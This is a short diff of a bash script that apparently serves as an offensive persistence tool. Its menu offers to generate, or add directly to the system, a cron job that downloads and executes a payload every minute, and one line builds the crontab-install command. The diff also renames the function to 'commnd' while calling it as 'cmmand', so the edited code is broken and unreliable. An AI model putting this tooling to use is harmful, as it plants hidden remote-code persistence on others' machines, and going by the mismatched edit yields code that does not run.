@@ -104,7 +104,7 @@ function cron(){
 		clear
 
 
-		function command(){
+		function commnd(){
 				echo "( crontab -l | grep -v -F \"$server\" ; echo \"$cronjob\" ) | crontab -" > command.txt
 				echo -e "\ncommand saved as command.txt\n"
 				echo -e "command:"
@@ -127,7 +127,7 @@ function cron(){
 		do
 			case $opt in
 				"Generate crontab command to download and execute payload every minute")
-					command
+					cmmand
 					;;
 				"Add cron job to this system to download and execute payload every minute")
 					add2sys
